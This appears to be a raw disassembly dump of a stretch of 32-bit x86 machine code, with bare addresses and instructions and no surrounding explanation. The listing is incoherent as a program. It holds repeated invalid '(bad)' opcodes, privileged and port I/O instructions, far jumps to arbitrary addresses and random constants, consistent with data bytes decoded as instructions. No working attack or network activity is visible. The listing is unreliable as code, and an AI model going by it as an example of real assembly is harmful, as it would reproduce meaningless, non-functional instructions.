  423f00:	stos   BYTE PTR es:[edi],al
  423f01:	push   ebx
  423f02:	dec    edx
  423f03:	fcmovne st,st(7)
  423f05:	mov    ds:0x8affb994,eax
  423f0a:	sar    ecx,0x78
  423f0d:	lods   eax,DWORD PTR ds:[esi]
  423f0e:	iret   
  423f0f:	jg     0x423f84
  423f11:	sbb    ebx,DWORD PTR [ecx]
  423f13:	push   ss
  423f14:	pop    edx
  423f15:	sbb    eax,ecx
  423f17:	in     al,dx
  423f18:	icebp  
  423f19:	vpxor  ymm3,ymm1,YMMWORD PTR [edx-0x79]
  423f1e:	mov    DWORD PTR [eax],edi
  423f20:	int3   
  423f21:	pop    ss
  423f22:	cmp    dh,dl
  423f24:	adc    al,0xc4
  423f26:	push   esp
  423f27:	pop    es
  423f28:	lahf   
  423f29:	push   cs
  423f2a:	xchg   ebx,eax
  423f2b:	add    bh,BYTE PTR [ebx-0x7fec0ff5]
  423f31:	lds    eax,FWORD PTR [edi+0x64]
  423f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f35:	retf   
  423f36:	mov    cs,WORD PTR [edi]
  423f38:	jo     0x423f5d
  423f3a:	arpl   WORD PTR [edi+0x23f7cb2c],di
  423f40:	push   0x33
  423f42:	xor    bl,0x8e
  423f45:	jecxz  0x423f13
  423f47:	and    DWORD PTR [ebp-0x2e0259f5],ebx
  423f4d:	mov    esi,0x0
	...
  423f5a:	cmp    DWORD PTR [ecx+ecx*4],ebx
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0x32e902b9
  423f67:	push   edx
  423f68:	sbb    eax,0x1b89c23
  423f6d:	add    ah,bh
  423f6f:	add    DWORD PTR [eax],eax
  423f71:	add    BYTE PTR [eax+0xc6c5ec6],bh
  423f77:	mov    BYTE PTR [edx],bl
  423f79:	std    
  423f7a:	jmp    0x423f5f
  423f7c:	and    DWORD PTR [esi-0x20e81edf],ebx
  423f82:	jns    0x423ff5
  423f84:	bound  edi,QWORD PTR [ebx+0x3e3dda6c]
  423f8a:	push   0x3c
  423f8c:	out    0xe5,eax
  423f8e:	ror    BYTE PTR [esi],1
  423f90:	add    ax,di
  423f93:	sbb    al,0x0
  423f95:	(bad)  
  423f97:	gs sub ah,bl
  423f9a:	and    BYTE PTR [eax-0x1c],0x75
  423f9e:	in     al,dx
  423f9f:	cmp    DWORD PTR ds:0xa729d812,edi
  423fa5:	xor    BYTE PTR [ebx+0x4d],ch
  423fa8:	mov    bl,0x56
  423faa:	push   edx
  423fab:	mov    edx,0xe0ac6c01
  423fb0:	adc    DWORD PTR ds:0xd348077e,ebx
  423fb6:	sbb    eax,0x813ee52f
  423fbb:	xlat   BYTE PTR ds:[ebx]
  423fbc:	mov    WORD PTR [ebp+0x10528ee],ds
  423fc2:	jecxz  0x423fec
  423fc4:	lea    esp,[edi*4-0x3d2cb72f]
  423fcb:	shl    BYTE PTR [esi-0x52],1
  423fce:	arpl   WORD PTR [edx],di
  423fd0:	dec    ecx
  423fd1:	xlat   BYTE PTR ds:[ebx]
  423fd2:	xchg   ebx,eax
  423fd3:	out    0x5e,al
  423fd5:	js     0x423fe9
  423fd7:	ret    
  423fd8:	nop    DWORD PTR [ecx]
  423fdb:	stos   BYTE PTR es:[edi],al
  423fdc:	push   es
  423fdd:	and    BYTE PTR [ecx+0x2d],dh
  423fe0:	pop    esi
  423fe1:	dec    edx
  423fe2:	int    0x9a
  423fe4:	xchg   BYTE PTR [edx-0x4],bh
  423fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fe8:	add    edi,DWORD PTR [ebp+0x30]
  423feb:	jp     0x424038
  423fed:	cdq    
  423fee:	jae    0x424007
  423ff0:	adc    BYTE PTR [edi+0x4b],dh
  423ff3:	pop    esp
  423ff4:	mov    ecx,0x86dfba5f
  423ff9:	adc    BYTE PTR [ebx+0x22],al
  423ffc:	(bad)  
  423ffd:	adc    al,0x4c
  423fff:	(bad)  
  424000:	loope  0x423f8a
  424002:	scas   al,BYTE PTR es:[edi]
  424003:	aaa    
  424004:	cmp    eax,DWORD PTR [ebp-0x55f9aa27]
  42400a:	out    dx,al
  42400b:	fisub  WORD PTR [ebx-0x5d]
  42400e:	inc    edx
  42400f:	in     eax,0x3b
  424011:	lahf   
  424012:	inc    ecx
  424013:	mov    ebp,DWORD PTR [edi+edx*2+0x3b8c5a9e]
  42401a:	push   edi
  42401b:	dec    ecx
  42401c:	sar    DWORD PTR [edx+0xd79ab6c],1
  424022:	pop    ebp
  424023:	mov    ds:0x29149d95,al
  424028:	sbb    al,0x4d
  42402a:	loopne 0x423fca
  42402c:	cmp    edx,DWORD PTR [ecx+0x4e]
  42402f:	rcr    esi,0x90
  424032:	fist   WORD PTR [eax-0x8957076]
  424038:	out    dx,eax
  424039:	sbb    al,0xc5
  42403b:	sbb    ch,dl
  42403d:	fidivr WORD PTR [eax-0x1d3b816f]
  424043:	(bad)  
  424044:	push   0x26
  424046:	test   eax,0xc8ac155a
  42404b:	stos   BYTE PTR es:[edi],al
  42404c:	mov    eax,0x55f95dc7
  424051:	scas   eax,DWORD PTR es:[edi]
  424052:	addr16 popf 
  424054:	stos   DWORD PTR es:[edi],eax
  424055:	test   DWORD PTR [ebx+0x17],ecx
  424058:	rol    DWORD PTR [edi+eiz*4],1
  42405b:	jne    0x42404c
  42405d:	fnsave ds:0x17e7e943
  424063:	into   
  424064:	jbe    0x424015
  424066:	and    BYTE PTR [ebx],dl
  424068:	cld    
  424069:	das    
  42406a:	mov    bh,BYTE PTR [edi+0x5e6dd26c]
  424070:	add    edx,ebp
  424072:	sub    BYTE PTR ds:0x61c99499,al
  424078:	push   esp
  424079:	test   esi,esp
  42407b:	fstp   TBYTE PTR [edx-0x23]
  42407e:	push   ds
  42407f:	mov    ds:0x385338,eax
  424084:	sbb    cl,BYTE PTR [ebx+0x62]
  424087:	dec    ecx
  424088:	stc    
  424089:	push   ss
  42408a:	jl     0x424101
  42408c:	outs   dx,DWORD PTR ds:[esi]
  42408d:	loope  0x4240f2
  42408f:	xor    DWORD PTR [ebp+eax*2+0x6ed259f8],eax
  424096:	inc    edx
  424097:	mov    edx,0x994759e4
  42409c:	(bad)  
  42409d:	stos   DWORD PTR es:[edi],eax
  42409e:	adc    DWORD PTR ss:[edi-0x7f],esp
  4240a2:	fs ret 0x708c
  4240a6:	sqrtps xmm6,XMMWORD PTR [ecx+0x6ace3369]
  4240ad:	sub    edx,edx
  4240af:	xor    edi,DWORD PTR [edi]
  4240b1:	add    bh,0xa9
  4240b4:	gs jne 0x424065
  4240b7:	arpl   WORD PTR [edx-0x43],si
  4240ba:	retf   
  4240bb:	push   ss
  4240bc:	and    DWORD PTR [ecx+0x45],0x66
  4240c0:	mov    ebp,0x4b22b6e0
  4240c5:	ror    DWORD PTR [edi],0xd3
  4240c8:	cwde   
  4240c9:	iret   
  4240ca:	mov    edi,DWORD PTR [eax-0x70]
  4240cd:	fisubr WORD PTR [eax+0x69786bb9]
  4240d3:	mov    ds:0x74b1815c,eax
  4240d8:	inc    eax
  4240d9:	push   0xa4a9c507
  4240de:	sub    al,0x19
  4240e0:	(bad)  
  4240e1:	out    0x5c,al
  4240e3:	and    ebp,DWORD PTR [ebx+0x26a2b11a]
  4240e9:	push   ebx
  4240ea:	push   0xfffffff1
  4240ec:	jno    0x424087
  4240ee:	lods   eax,DWORD PTR ds:[esi]
  4240ef:	mov    DWORD PTR [esi-0x32],0x4454134
  4240f6:	sub    DWORD PTR [edx-0x6c367710],0x3981a307
  424100:	sar    DWORD PTR [eax],0x21
  424103:	push   0xfffffffd
  424105:	xchg   ecx,eax
  424106:	es (bad) 
  424108:	out    0x55,al
  42410a:	test   eax,0xd994b5b8
  42410f:	aas    
  424110:	push   edx
  424111:	and    eax,0xc3e2ea89
  424116:	push   eax
  424117:	push   cs
  424118:	xchg   esi,eax
  424119:	lds    ecx,FWORD PTR [ebx-0x49]
  42411c:	and    ebx,ecx
  42411e:	(bad)  
  42411f:	cli    
  424120:	push   eax
  424121:	imul   esi,DWORD PTR [ebx],0x72
  424124:	nop
  424125:	fs jle 0x42411b
  424128:	and    DWORD PTR [esp+ecx*8-0x45],edi
  42412c:	sbb    BYTE PTR [esp+ecx*4],0x83
  424130:	or     cl,ch
  424132:	xchg   esi,eax
  424133:	xor    ebp,DWORD PTR [eax-0x3f]
  424136:	sub    dh,BYTE PTR [ebp-0x3e]
  424139:	cmp    eax,0xaa56de89
  42413e:	sub    eax,0xb968573b
  424143:	test   BYTE PTR [edx],cl
  424145:	cli    
  424146:	ret    0x6d2b
  424149:	cmc    
  42414a:	cmc    
  42414b:	pop    esi
  42414c:	jmp    0x4241b4
  42414e:	sbb    al,bl
  424150:	cmp    ah,al
  424152:	xchg   ecx,eax
  424153:	sub    ebx,ecx
  424155:	xor    bh,BYTE PTR [edx-0x10f52ee2]
  42415b:	dec    edx
  42415c:	mov    ah,0x73
  42415e:	pusha  
  42415f:	or     ebx,esi
  424161:	lock test DWORD PTR ds:0xad026027,edi
  424168:	mov    dl,0x24
  42416a:	stos   BYTE PTR es:[edi],al
  42416b:	xor    DWORD PTR [ebx],eax
  42416d:	sbb    eax,0x0
	...
  42417a:	gs mov ah,0x18
  42417d:	fcompp 
  42417f:	(bad)  
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	enter  0x80e3,0x71
  42418a:	cwde   
  42418b:	mov    edx,0x1fc0001
  424190:	add    BYTE PTR [eax],al
  424192:	imul   edi,DWORD PTR [edi+ebp*1],0xfffffff0
  424196:	shr    DWORD PTR [esi-0x1993db],1
  42419c:	lds    ebx,FWORD PTR [esi-0x5]
  42419f:	jo     0x4241c2
  4241a1:	sbb    dh,dh
  4241a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241a4:	cmp    BYTE PTR [esi+0x1b],bl
  4241a7:	or     ax,0xc571
  4241ab:	cdq    
  4241ac:	push   0xf603c151
  4241b1:	pop    ebp
  4241b2:	scas   al,BYTE PTR es:[edi]
  4241b3:	es dec esi
  4241b5:	scas   eax,DWORD PTR es:[edi]
  4241b6:	adc    DWORD PTR [esi-0x47f0620],edi
  4241bc:	in     al,0x9
  4241be:	or     ah,BYTE PTR [edi-0x51]
  4241c1:	pop    esi
  4241c2:	jle    0x424159
  4241c4:	push   ebp
  4241c5:	retf   0xbbc3
  4241c8:	dec    ecx
  4241c9:	pmaxsw mm2,QWORD PTR cs:[edi]
  4241cd:	out    0x3b,eax
  4241cf:	test   al,0x6b
  4241d1:	popa   
  4241d2:	out    0x14,eax
  4241d4:	jmp    FWORD PTR [ebx+0x2c65418]
  4241da:	mov    esi,0x725cd879
  4241df:	mov    edx,0x28ee3b7c
  4241e4:	sbb    bl,BYTE PTR [edx-0x38]
  4241e7:	adc    al,0xab
  4241e9:	icebp  
  4241ea:	sahf   
  4241eb:	mov    dl,0x71
  4241ed:	shr    BYTE PTR [ecx-0x1c],cl
  4241f0:	fld    DWORD PTR [edx+0x2959dcef]
  4241f6:	or     BYTE PTR [ecx-0x583b890e],dl
  4241fc:	sub    ebx,DWORD PTR [ecx]
  4241fe:	(bad)  
  4241ff:	das    
  424200:	ins    DWORD PTR es:[edi],dx
  424201:	push   ecx
  424202:	inc    ebp
  424203:	cmp    al,0xd
  424205:	inc    ebp
  424206:	push   edx
  424207:	xor    ecx,ebx
  424209:	jbe    0x424226
  42420b:	mov    DWORD PTR [eax+0x2a],ebx
  42420e:	mov    dl,0xdf
  424210:	mov    edi,DWORD PTR [esi]
  424212:	rcr    DWORD PTR [ebx],1
  424214:	lahf   
  424215:	scas   eax,DWORD PTR es:[edi]
  424216:	leave  
  424217:	push   cs
  424218:	div    BYTE PTR ss:[edx+0x24]
  42421c:	and    al,0x9a
  42421e:	pop    edi
  42421f:	es int 0xcd
  424222:	inc    esp
  424223:	and    edx,ebp
  424225:	mov    ch,0x84
  424227:	mov    ebx,DWORD PTR [edx+0x1c]
  42422a:	retf   0x97a8
  42422d:	pop    esi
  42422e:	push   edx
  42422f:	cmp    ecx,DWORD PTR [ecx+0x24]
  424232:	jns    0x424208
  424234:	popa   
  424235:	sub    al,0x9e
  424237:	aam    0xf4
  424239:	in     al,0x61
  42423b:	gs int 0xd7
  42423e:	sub    DWORD PTR [ebx+0x4f],eax
  424241:	push   ebx
  424242:	dec    ecx
  424243:	arpl   WORD PTR [edx+ecx*1+0x55],cx
  424247:	mov    ebx,0x5911df05
  42424c:	scas   eax,DWORD PTR es:[edi]
  42424d:	iret   
  42424e:	xchg   edi,eax
  42424f:	mov    esp,ds
  424251:	push   esi
  424252:	ds inc esp
  424254:	test   DWORD PTR [ebx+0x6f039ba],edx
  42425a:	pop    ebp
  42425b:	jnp    0x4242a8
  42425d:	add    DWORD PTR [ebp-0x2c],0x49
  424261:	xchg   BYTE PTR [ecx+ecx*4],dl
  424264:	in     al,dx
  424265:	cmc    
  424266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424267:	loopne 0x424289
  424269:	jb     0x42425e
  42426b:	or     eax,0xc502b62f
  424270:	jl     0x424291
  424272:	mov    esi,0x5d8fe36
  424277:	cmp    ecx,0x2e
  42427a:	add    ah,bh
  42427c:	mov    eax,ds:0x6ffd16db
  424281:	pop    esp
  424282:	xchg   ebx,eax
  424283:	data16 mov dl,0x67
  424286:	mov    ebx,0xea48da5e
  42428b:	xchg   ebx,eax
  42428c:	sbb    eax,0x1a1513a2
  424291:	and    DWORD PTR [eax+edi*1],0x4e
  424295:	jmp    DWORD PTR [esi+0x43]
  424298:	loopne 0x424296
  42429a:	mov    cl,al
  42429c:	dec    ecx
  42429d:	push   es
  42429e:	cmp    ebx,DWORD PTR [ebp+0x604254ac]
  4242a4:	sbb    al,0x8e
  4242a6:	int3   
  4242a7:	in     eax,0xea
  4242a9:	push   es
  4242aa:	sbb    eax,DWORD PTR [ebp-0x15c4220d]
  4242b0:	mov    bh,0xf2
  4242b2:	(bad)  
  4242b3:	mov    edx,0x55071349
  4242b8:	or     dh,BYTE PTR [ebx+edi*1+0xdf17e4]
  4242bf:	mov    ch,0x33
  4242c1:	repz add DWORD PTR [esp+eax*2-0x22707645],ebp
  4242c9:	lea    esi,[eax+eiz*8-0x47ec3ca]
  4242d0:	push   ebx
  4242d1:	add    ecx,0x3644b642
  4242d7:	cld    
  4242d8:	sub    eax,0x7a1d972e
  4242dd:	sbb    bh,0xf4
  4242e0:	push   ebx
  4242e1:	cmp    eax,0xa9e831bf
  4242e6:	es and esp,eax
  4242e9:	inc    ebp
  4242ea:	mov    esi,0x537f7cb3
  4242ef:	imul   ecx,DWORD PTR [eax],0x89bf1524
  4242f5:	cmp    bl,cl
  4242f7:	jo     0x424344
  4242f9:	inc    esp
  4242fa:	test   eax,0x90591a4c
  4242ff:	ins    DWORD PTR es:[edi],dx
  424300:	mov    ah,0xd6
  424302:	add    esp,edi
  424304:	mov    al,ds:0xdd190b76
  424309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42430a:	cli    
  42430b:	loop   0x424329
  42430d:	mov    ds:0x5fd4cd45,eax
  424312:	push   ss
  424313:	(bad)  
  424314:	sub    al,0x3d
  424316:	mov    ebp,0xb4a10790
  42431b:	adc    BYTE PTR ds:0xddfa4744,ah
  424321:	mov    bh,0xd4
  424323:	(bad)  
  424324:	sbb    esp,DWORD PTR [ebx]
  424326:	int3   
  424327:	cwde   
  424328:	dec    esi
  424329:	xchg   ebp,eax
  42432a:	cs sub bh,ah
  42432d:	rcl    dh,1
  42432f:	dec    esi
  424330:	aaa    
  424331:	ret    
  424332:	or     DWORD PTR [esi+edi*4+0x6e552612],0xffffffba
  42433a:	sbb    al,0xb8
  42433c:	adc    ax,0xd7be
  424341:	dec    esi
  424342:	xlat   BYTE PTR ds:[ebx]
  424343:	xor    ch,BYTE PTR [ebp+0x606e9766]
  424349:	inc    eax
  42434a:	sub    eax,0x89370473
  42434f:	sbb    eax,0x16bf92d5
  424354:	push   0xffffff91
  424356:	sub    ah,bh
  424358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424359:	mov    ds:0xaa23062c,eax
  42435e:	clc    
  42435f:	pop    eax
  424360:	cmp    esi,DWORD PTR [ebp-0x4a4c6ce0]
  424366:	cmp    cl,BYTE PTR [ebp+0x58]
  424369:	(bad)  
  42436a:	jns    0x4243a2
  42436c:	dec    ebx
  42436d:	(bad)  
  42436e:	add    al,0x7d
  424370:	cmp    BYTE PTR [edi+0x17235995],cl
  424376:	or     eax,0x19573f3a
  42437b:	xor    BYTE PTR [eax-0x59646b8d],ch
  424381:	ja     0x42437c
  424383:	in     al,0x50
  424385:	test   eax,0x6c0caf72
  42438a:	mov    eax,ds:0xe07913
	...
  424397:	add    BYTE PTR [eax],al
  424399:	add    BYTE PTR [edx],dl
  42439b:	fsub   DWORD PTR [ebx+0x72]
  42439e:	jmp    0x42439b
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	add    BYTE PTR [edx+eiz*8+0x1bc9405],cl
  4243ad:	add    ah,bh
  4243af:	add    DWORD PTR [eax],eax
  4243b1:	add    BYTE PTR [ebp-0x4d05b7d3],bl
  4243b7:	push   0x892f6537
  4243bc:	mov    ebp,0x607ed92
  4243c1:	outs   dx,BYTE PTR ds:[esi]
  4243c2:	fstp   QWORD PTR [eax+0x69]
  4243c5:	cmp    eax,0x1fcd39ea
  4243ca:	das    
  4243cb:	adc    edi,DWORD PTR [edx+0x6c3ad1ea]
  4243d1:	push   edi
  4243d2:	sub    bh,BYTE PTR [ecx-0x75aec824]
  4243d8:	or     al,0xd7
  4243da:	add    BYTE PTR [esi],cl
  4243dc:	lods   eax,DWORD PTR ds:[esi]
  4243dd:	dec    eax
  4243de:	ins    BYTE PTR es:[edi],dx
  4243df:	pusha  
  4243e0:	aad    0x2a
  4243e2:	sti    
  4243e3:	add    BYTE PTR [ebx-0x2f],ch
  4243e6:	aaa    
  4243e7:	rcl    DWORD PTR [ecx+0x4981a577],0x93
  4243ee:	ds pusha 
  4243f0:	shl    BYTE PTR [ebx+ebp*4+0x64e33303],0x92
  4243f8:	adc    al,0xf4
  4243fa:	inc    edi
  4243fb:	inc    ecx
  4243fc:	push   ebp
  4243fd:	xchg   esp,eax
  4243fe:	aad    0xe3
  424400:	repz lahf 
  424402:	cmp    al,0x45
  424404:	mov    bh,0x1a
  424406:	and    ecx,DWORD PTR [ebx-0xcc46f37]
  42440c:	push   esp
  42440d:	ret    0x5d9
  424410:	mov    esp,0xfb47a7bc
  424415:	sar    BYTE PTR [edx+0x75],0x70
  424419:	or     BYTE PTR [ebx-0x16],dh
  42441c:	pusha  
  42441d:	xor    bl,BYTE PTR [esi]
  42441f:	or     esi,esp
  424421:	jmp    0xe6db6b45
  424426:	adc    ecx,esi
  424428:	xchg   esp,eax
  424429:	test   eax,0x48f71d34
  42442e:	aam    0xa6
  424430:	test   DWORD PTR [esi+0x72],ebp
  424433:	mov    al,dl
  424435:	mov    eax,0xcc483fb2
  42443a:	adc    DWORD PTR [ebx-0x2b],esi
  42443d:	stos   DWORD PTR es:[edi],eax
  42443e:	ret    0x645d
  424441:	loopne 0x4244c1
  424443:	into   
  424444:	xchg   BYTE PTR [ecx+0x14f28c2a],ah
  42444a:	push   0x27
  42444c:	scas   al,BYTE PTR es:[edi]
  42444d:	mov    bh,0xe5
  42444f:	mov    ds:0xad4975fa,eax
  424454:	mov    ch,BYTE PTR [edx+ebp*1-0x3dd68c35]
  42445b:	(bad)
  42445f:	sub    DWORD PTR [esi+ebp*8+0x3957c82d],ecx
  424466:	lds    eax,FWORD PTR [edi-0xf]
  424469:	outs   dx,DWORD PTR ds:[esi]
  42446a:	fadd   DWORD PTR [eax-0x3ab7c4e9]
  424470:	sbb    eax,0x2325796a
  424475:	repnz mov esp,0xf168337e
  42447b:	push   ss
  42447c:	ins    DWORD PTR es:[edi],dx
  42447d:	and    edx,DWORD PTR [eax]
  42447f:	jb     0x42444c
  424481:	js     0x424461
  424483:	scas   eax,DWORD PTR es:[edi]
  424484:	stos   BYTE PTR es:[edi],al
  424485:	int    0xaf
  424487:	sub    DWORD PTR [ebp+0x29],eax
  42448a:	add    BYTE PTR [ebp-0x41cbac8a],ah
  424490:	jnp    0x4244cf
  424492:	out    0xca,eax
  424494:	and    eax,0x4f43abf3
  424499:	pop    edi
  42449a:	push   edx
  42449b:	fisub  WORD PTR [edi]
  42449d:	retf   0x77b
  4244a0:	xor    cl,BYTE PTR [esi+0x27]
  4244a3:	adc    al,0x82
  4244a5:	xchg   ebx,eax
  4244a6:	dec    edi
  4244a7:	ror    ch,0xa8
  4244aa:	push   ss
  4244ab:	jo     0x4244ba
  4244ad:	(bad)  
  4244ae:	fsave  [ecx]
  4244b1:	jns    0x42444c
  4244b3:	xchg   ecx,eax
  4244b4:	jae    0x424531
  4244b6:	mov    al,ds:0xd7e30465
  4244bb:	pop    edi
  4244bc:	in     eax,dx
  4244bd:	nop
  4244be:	inc    edx
  4244bf:	(bad)  
  4244c0:	mov    dl,0x58
  4244c2:	pop    esi
  4244c3:	push   ds
  4244c4:	test   eax,0x6c18afe7
  4244c9:	sbb    BYTE PTR [ebp-0x50],ch
  4244cc:	jno    0x4244da
  4244ce:	int3   
  4244cf:	fisub  WORD PTR ds:0x15a4050
  4244d5:	mov    ebx,DWORD PTR [eax]
  4244d7:	and    edi,DWORD PTR [ecx]
  4244d9:	je     0x42448e
  4244db:	or     BYTE PTR [edi+0x53],cl
  4244de:	cli    
  4244df:	leave  
  4244e0:	clc    
  4244e1:	fcom   QWORD PTR [eax]
  4244e3:	push   ds
  4244e4:	inc    edx
  4244e5:	xlat   BYTE PTR ds:[ebx]
  4244e6:	and    al,0xc4
  4244e8:	xor    BYTE PTR [eax+0x59],0xab
  4244ec:	outs   dx,DWORD PTR ds:[esi]
  4244ed:	and    BYTE PTR [eax+0x43],dh
  4244f0:	sbb    bh,0x6c
  4244f3:	push   ebx
  4244f4:	mov    dl,0xc9
  4244f6:	jl     0x42456f
  4244f8:	inc    edx
  4244f9:	ss jnp 0x424523
  4244fc:	push   eax
  4244fd:	push   0x1b
  4244ff:	je     0x4244fe
  424501:	jns    0x4244cb
  424503:	lds    edx,FWORD PTR [edi-0x74c57db5]
  424509:	pop    edi
  42450a:	retf   
  42450b:	(bad)  
  42450c:	jns    0x4244a4
  42450e:	push   ebx
  42450f:	daa    
  424510:	jo     0x4244d5
  424512:	sbb    ah,BYTE PTR [ebx]
  424514:	or     ah,BYTE PTR [edx+0x47138ffe]
  42451a:	and    ecx,DWORD PTR [edx+0x61338666]
  424520:	jecxz  0x424560
  424522:	xchg   edx,eax
  424523:	das    
  424524:	test   eax,0xa27030ea
  424529:	xor    BYTE PTR [edi+eax*8-0x7b],dh
  42452d:	mov    cl,0x93
  42452f:	push   edi
  424530:	cmc    
  424531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424532:	ror    dl,1
  424534:	(bad)  
  424535:	add    eax,DWORD PTR [esi]
  424537:	or     eax,0x771c5ebc
  42453c:	into   
  42453d:	sar    DWORD PTR [ecx+0x1e9f008f],0xc3
  424544:	inc    esi
  424545:	es cmp cl,BYTE PTR gs:[ecx-0x5c]
  42454a:	jno    0x424557
  42454c:	push   eax
  42454d:	pop    esi
  42454e:	mov    eax,ds:0x52a146bb
  424553:	pop    edx
  424554:	jo     0x424532
  424556:	jg     0x42454f
  424558:	jmp    0x2f07:0x90c890e0
  42455f:	mov    ds:0x80736293,al
  424564:	jne    0x42453b
  424566:	mov    al,ds:0xff396724
  42456b:	loopne 0x4245ec
  42456d:	call   0xf4bfdd40
  424572:	mov    DWORD PTR [edx],esi
  424574:	dec    esi
  424575:	mov    esp,0xe617ccb2
  42457a:	inc    edi
  42457b:	push   ebx
  42457c:	retf   0xd0c4
  42457f:	dec    esp
  424580:	dec    edi
  424581:	fmul   st(7),st
  424583:	sub    eax,0xc59a700e
  424588:	push   eax
  424589:	(bad)  
  42458a:	mov    ecx,0x4287f99a
  42458f:	sti    
  424590:	int3   
  424591:	addr16 adc eax,esi
  424594:	sti    
  424595:	rcr    ch,cl
  424597:	sbb    edi,0xbefe75df
  42459d:	mov    dl,0x70
  42459f:	mov    edx,0x6efa331
  4245a4:	sahf   
  4245a5:	out    0xeb,eax
  4245a7:	les    esi,FWORD PTR [ebp+0x52]
  4245aa:	stos   BYTE PTR es:[edi],al
  4245ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245ac:	push   0x8f
	...
  4245b9:	add    BYTE PTR [esi],cl
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax-0x19069449]
  4245c9:	add    eax,0x1be90
  4245ce:	cld    
  4245cf:	add    DWORD PTR [eax],eax
  4245d1:	add    BYTE PTR [edx+0x14156c11],dl
  4245d7:	int    0xbf
  4245d9:	test   ah,dh
  4245db:	jbe    0x4245a5
  4245dd:	pop    ds
  4245de:	ss (bad) 
  4245e0:	mov    ah,0x68
  4245e2:	push   ebx
  4245e3:	adc    DWORD PTR [esp+ebp*2],ebp
  4245e6:	jl     0x42458c
  4245e8:	jae    0x424603
  4245ea:	pusha  
  4245eb:	scas   al,BYTE PTR es:[edi]
  4245ec:	jbe    0x424634
  4245ee:	ins    DWORD PTR es:[edi],dx
  4245ef:	dec    ecx
  4245f0:	ins    BYTE PTR es:[edi],dx
  4245f1:	push   0xffffffda
  4245f3:	mov    dl,bl
  4245f5:	xor    al,0x34
  4245f7:	mov    al,ds:0xc18cfbed
  4245fc:	push   ebx
  4245fd:	rcr    bh,cl
  4245ff:	and    al,0x45
  424601:	sub    esp,DWORD PTR fs:[ecx]
  424604:	pop    edi
  424605:	rcr    edi,1
  424607:	mov    dh,0x1c
  424609:	xchg   esi,eax
  42460a:	rcl    DWORD PTR [edi+0xd],cl
  42460d:	shl    DWORD PTR es:[ebp-0x6e90bc57],0x91
  424615:	push   edi
  424616:	xchg   esi,eax
  424617:	in     eax,0x4c
  424619:	jmp    0x4245af
  42461b:	cld    
  42461c:	stc    
  42461d:	add    eax,0x41ca0483
  424622:	sbb    bh,dh
  424624:	cmp    bh,ah
  424626:	sar    DWORD PTR [esi+0x3b],cl
  424629:	stos   DWORD PTR es:[edi],eax
  42462a:	clc    
  42462b:	push   esi
  42462c:	jae    0x4245f9
  42462e:	arpl   WORD PTR [eax+0x584d8c54],bx
  424634:	in     eax,dx
  424635:	push   ds
  424636:	mov    esp,0xeb4292b7
  42463b:	loop   0x42467d
  42463d:	xchg   edx,eax
  42463e:	aas    
  42463f:	pushf  
  424640:	adc    eax,0x8ecef393
  424645:	shr    DWORD PTR [esi],0x44
  424648:	mov    ebx,0x6c334ead
  42464d:	pop    ecx
  42464e:	mov    BYTE PTR [eax-0x7a],0x6c
  424652:	retf   0xf099
  424655:	es aas 
  424657:	(bad)  
  42465a:	std    
  42465b:	adc    edx,edi
  42465d:	dec    esp
  42465e:	sbb    cl,ch
  424660:	sbb    al,0x40
  424662:	inc    esp
  424663:	pop    esp
  424664:	iret   
  424665:	xchg   BYTE PTR [edi],bl
  424667:	mov    eax,ds:0x26eea0c
  42466c:	push   ecx
  42466d:	test   ch,ah
  42466f:	sub    al,0x37
  424671:	inc    ebx
  424672:	popf   
  424673:	and    al,0x5e
  424675:	sub    DWORD PTR [edi],ebx
  424677:	in     eax,dx
  424678:	fwait
  424679:	(bad)  
  42467a:	mov    dl,0x1c
  42467c:	pop    edx
  42467d:	sbb    eax,0xf6d8662
  424682:	or     DWORD PTR [esi],ebp
  424684:	mov    WORD PTR ds:0x17afb382,ds
  42468a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42468b:	loope  0x42466f
  42468d:	xor    al,ch
  42468f:	pop    es
  424690:	test   al,0xd8
  424692:	add    al,0xf2
  424694:	arpl   WORD PTR [ecx-0x6932c1a8],bp
  42469a:	lock jle 0x424712
  42469d:	push   ebp
  42469e:	and    BYTE PTR ds:0x4252eeb3,bh
  4246a4:	jp     0x4246d1
  4246a6:	les    eax,FWORD PTR [ebx-0x72febd47]
  4246ac:	(bad)  
  4246ad:	cmc    
  4246ae:	(bad)  
  4246b0:	stos   BYTE PTR es:[edi],al
  4246b1:	adc    BYTE PTR [ebp-0x6adb845f],bl
  4246b7:	pop    esi
  4246b8:	jno    0x4246cc
  4246ba:	dec    edi
  4246bb:	test   DWORD PTR [eax+0x717a729e],ebp
  4246c1:	outs   dx,BYTE PTR ds:[esi]
  4246c2:	gs loopne 0x424649
  4246c5:	in     al,0xae
  4246c7:	es mov ah,0x25
  4246ca:	xchg   ebx,eax
  4246cb:	mov    edi,0x44e2a898
  4246d0:	mov    es,edx
  4246d2:	test   al,0x92
  4246d4:	pop    esi
  4246d5:	push   edi
  4246d6:	lods   al,BYTE PTR ds:[esi]
  4246d7:	bound  eax,QWORD PTR [ebx]
  4246d9:	add    ch,BYTE PTR [ecx+0x3979cca8]
  4246df:	fwait
  4246e0:	dec    ebx
  4246e1:	out    0x9b,al
  4246e3:	retf   0xc7a0
  4246e6:	enter  0xce58,0xc2
  4246ea:	push   cs
  4246eb:	repz (bad) 
  4246ed:	jge    0x4246d6
  4246ef:	inc    ebp
  4246f0:	mov    bh,BYTE PTR [edi]
  4246f2:	mov    dl,0x82
  4246f4:	outs   dx,BYTE PTR ds:[esi]
  4246f5:	pop    eax
  4246f6:	push   ecx
  4246f7:	pop    esp
  4246f8:	shl    DWORD PTR [edi],1
